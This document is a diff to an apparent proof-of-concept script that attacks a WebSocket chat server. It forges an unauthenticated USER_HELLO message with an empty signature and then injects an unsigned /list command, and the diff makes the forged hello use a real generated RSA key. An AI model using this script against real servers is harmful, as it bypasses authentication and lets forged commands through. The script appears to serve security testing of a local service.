@@ -14,15 +14,18 @@ import time
 
 import websockets
 
+from crypto import generate_rsa_keypair
+
 
 async def main(host="127.0.0.1", port=8080, user="attacker"):
     uri = f"ws://{host}:{port}/ws"
+    private_key_b64, public_key_b64 = generate_rsa_keypair()
     async with websockets.connect(uri) as ws:
         # Fake USER_HELLO: no auth, no transport signature
         await ws.send(json.dumps({
             "type": "USER_HELLO",
             "from": user, "to": "server", "ts": int(time.time() * 1000),
-            "payload": {"client": "poc", "pubkey": "fake"}, "sig": ""
+            "payload": {"client": "poc", "pubkey": public_key_b64}, "sig": ""
         }))
 
         # Inject unsigned COMMAND (/list)
